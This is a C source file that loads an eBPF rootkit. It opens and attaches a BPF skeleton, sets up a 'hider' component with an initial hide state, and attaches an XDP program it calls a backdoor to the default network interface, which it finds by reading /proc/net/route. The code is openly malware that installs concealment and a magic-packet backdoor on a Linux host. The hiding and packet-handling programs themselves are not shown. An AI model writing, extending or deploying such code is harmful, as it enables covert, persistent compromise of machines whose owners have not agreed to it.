#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <bpf/libbpf.h>
#include <net/if.h>
#include <linux/if_link.h>
#include <errno.h>
#include "config.h"
#include "userspace/hider.h"
#include "rootkit.skel.h"

/**
 * @brief Get the index of the default active interface by reading /proc/net/route
 * 
 * @return int iface index
 */
static int get_default_iface_index()
{
    char line[256];
    char dev[64];
    unsigned long dest;

    FILE *f = fopen("/proc/net/route", "r");
    if (!f)
        return -ENOENT;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%63s %lx", dev, &dest) == 2) {
            /* Destination 0.0.0.0 indicates default route interface */
            if (dest == 0 && strcmp(dev, "lo") != 0) {
                int if_index = if_nametoindex(dev);
                if (if_index == 0) {
                    fclose(f);
                    return -ENOENT;
                }
                fclose(f);
                return if_index;
            }
        }
    }
    fclose(f);
    return -ENODEV;
}

/**
 * @brief Load XDP backdoor
 * 
 * @param skel Rootkit skeleton
 * @return int 0 on success
 */
static int load_xdp_backdoor(struct rootkit *skel)
{
    int if_index = get_default_iface_index();

    if (if_index < 0)
        return if_index;

    skel->links.filter_magic_packets = bpf_program__attach_xdp(
        skel->progs.filter_magic_packets,
        if_index
    );

    return libbpf_get_error(skel->links.filter_magic_packets);

}

struct rootkit *load_rootkit(void)
{
    int ret;
    struct rootkit *skel;

    skel = rootkit__open();
    if (!skel) {
        perror("Failed to open BPF skeleton");
        return NULL;
    }

    ret = rootkit__load(skel);
    if (ret) {
        perror("Failed to load and verify BPF skeleton");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = hider_init(skel);
    if (ret) {
        perror("Failed to initialize hider");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = hider_set_initial_hide_state();
    if (ret) {
        perror("Failed to install initial state");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = load_xdp_backdoor(skel);
    if (ret) {
        perror("Failed to attach XDP backdoor");
        rootkit__destroy(skel);
        return NULL;
    }

    ret = rootkit__attach(skel);
    if (ret) {
        perror("Failed to attach BPF skeleton");
        rootkit__destroy(skel);
        return NULL;
    }

    return skel;
}

void unload_rootkit(struct rootkit *skel)
{
    rootkit__destroy(skel);
}
